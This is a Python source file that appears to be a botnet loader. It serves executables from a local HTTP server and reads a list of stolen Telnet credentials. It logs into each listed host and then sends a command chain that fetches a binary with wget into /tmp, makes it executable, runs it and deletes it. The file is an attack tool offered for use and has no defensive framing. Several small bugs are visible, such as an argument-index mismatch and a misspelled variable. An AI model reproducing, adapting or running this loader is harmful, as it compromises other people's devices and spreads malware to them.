import telnetlib, sys, os, http.server, socketserver
import json
'''TODO : Kill Telnet service on ports 22, 23, 233, 2323'''
from libs import truecolors

__bin__ = ""
__webp_ = "31338"           # bin server port
__file__="./ELF_file/"      # bin server port
Host_IP = ""

def read_config_ip():
    filename = 'ip_config.ini'
    with open(filename, 'r') as file:
        json_data = json.load(file)
    RelayIP = json_data['RelayIP']
    targetIP = json_data['targetIP']
    return RelayIP , targetIP



def ServeHTTP():
        web_dir = os.path.join(os.path.dirname(__file__), 'bin')    # 到bin資料夾下面抓出可執行檔
        os.chdir(web_dir)                                           # 切換當前路徑到新路徑上
        Handler = http.server.SimpleHTTPRequestHandler              # 提供HTTP請求服務
        httpd = socketserver.TCPServer((Host_IP, int(__webp_)), Handler) # 掛載TCP服務
        truecolors.print_info("Webserver started any:"+ __webp_)
        httpd.serve_forever()

def doConsumeLogin(ip, port, user, pass_):
    tn = None
    need_user = False
    while True:
        try:
            if not tn:
                asked_password_in_cnx = False
                tn = telnetlib.Telnet(ip, port)
                print ("[loader] Connection established to given ip %s"%ip)
            while True:
                response = tn.read_until(b":", 1)
                if "Login:" in str(response) or "Username:" in str(response):
                    print ("[loader] Received username prompt")
                    need_user = True
                    asked_password_in_cnx = False 
                    user, password = user, pass_
                    tn.write((user + "\n").encode('ascii'))
                elif "Password:" in str(response):
                    if asked_password_in_cnx and need_user:
                        tn.close()
                        break 
                    asked_password_in_cnx = True 
                    if not need_user:
                        user, password =  user, pass_
                    if not password:
                        print ("[loader] Login has failed...quitting.")
                        sys.exit(0)
                    print ("[loader] Received password prompt")
                    tn.write((password + "\n").encode('ascii'))
                if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                    # broken
                    print ("[loader] Login succeeded %s "%ip + ' : '.join((user, password)))
                    #response = tn.read_until(b"#", 1)
                    tn.write(("cd /tmp; cd/var/run; cd /mnt; cd/root; wget %s; chmod +x %s; ./%s; rm -rf %s;"%(__bin__, os.path.basename(__bin__), os.path.basename(__bin__), os.path.basename(__bin__)) + "\n").encode('ascii'))
                    print("[loader] Broken.")
                    break 
            if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                break
        except EOFError as e:
            tn = None
            need_user = False
            print("[scanner] Remote host dropped the connection (%s).."%str(e))

def ForceDB(fname):
    try:
        if os.path.isfile(fname):
            with open(fname) as f:
                for line in f:
                    usr  = line.split(':')[0].rstrip()
                    psw  = line.split(':')[1].rstrip()
                    ip   = line.split(':')[2].rstrip()
                    port = line.split(':')[3].rstrip()
                    doConsumeLogin(ip, port, usr, psw)
        else:
            truecolors.print_errn("Loader: File '%s' doesn't exists, check the path."%fname)
    except KeyboardInterrupt:
        truecolors.print_errn("Operation interrupted.")
    except Exception as e:
        truecolors.print_errn("Loader: " + str(e))

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        Host_IP , targerIP = read_config_ip()
        ServeHTTP()
        ForceDB(sys.argv[2])
    else:
        truecolors.print_errn("Error: Unrecognized arguments.")
        sys.exit(1)